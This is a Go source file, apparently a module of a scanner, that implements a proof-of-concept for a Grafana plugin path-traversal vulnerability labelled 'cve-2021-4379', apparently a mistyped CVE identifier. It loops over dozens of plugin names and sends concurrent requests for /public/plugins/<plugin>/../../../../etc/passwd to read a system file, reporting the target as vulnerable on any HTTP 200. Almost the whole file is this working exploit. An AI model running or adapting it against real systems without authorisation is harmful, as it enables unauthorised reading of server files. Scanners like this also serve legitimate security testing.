package scripts

import (
	"Gopo/utils"
	"context"
	"fmt"
	"github.com/xiecat/xhttp"

	"net/http"
	"sync"
)

const pocName1 = "Grafana-cve-2021-4379"

type grafanaTask struct {
	target string
	plugin string
}

var grafanaVul = false
var grafanaplugins = []string{"live", "icon", "loki", "text", "logs", "news", "stat", "mssql", "mixed", "mysql", "tempo", "graph", "gauge", "table", "debug", "zipkin", "jaeger", "geomap", "canvas", "grafana", "welcome", "xychart", "heatmap", "postgres", "testdata", "opentsdb", "influxdb", "barchart", "annolist", "bargauge", "graphite", "dashlist", "piechart", "dashboard", "nodeGraph", "alertlist", "histogram", "table-old", "pluginlist", "timeseries", "cloudwatch", "prometheus", "stackdriver", "alertGroups", "alertmanager", "elasticsearch", "gettingstarted", "state-timeline", "status-history", "grafana-clock-panel", "grafana-simple-json-datasource", "grafana-azure-monitor-datasource"}

func grafana(target string) {
	var wg sync.WaitGroup
	var tasks []grafanaTask
	taskChan := make(chan grafanaTask, threads)
	for _, plugin := range grafanaplugins {
		task := grafanaTask{
			plugin: plugin,
			target: target,
		}
		tasks = append(tasks, task)
	}

	worker := func(taskChan chan grafanaTask, wg *sync.WaitGroup) {
		for task := range taskChan {
			grafanaExecPoc(task)
			wg.Done()
		}
	}
	for i := 0; i < threads; i++ {
		go worker(taskChan, &wg)
	}

	for _, task := range tasks {
		taskChan <- task
		wg.Add(1)
	}
	wg.Wait()
	if grafanaVul {
		utils.Green("%v %v find", target, pocName1)
	}
}

func grafanaExecPoc(task grafanaTask) {
	target := task.target
	plugin := task.plugin
	path := fmt.Sprintf("/public/plugins/%v/../../../../../../../../etc/passwd", plugin)
	req := &xhttp.Request{}
	hr, _ := http.NewRequest("GET", target+path, nil)
	req.RawRequest = hr
	ctx := context.Background()
	oResp, err := utils.Client.Do(ctx, req)
	if err != nil {
		utils.Error(err)
		return
	}
	if oResp.GetStatus() == 200 {
		grafanaVul = true
		utils.InforF("%v plugin exists", plugin)
	}
}

func init() {
	scriptRegister(pocName1, grafana)
}
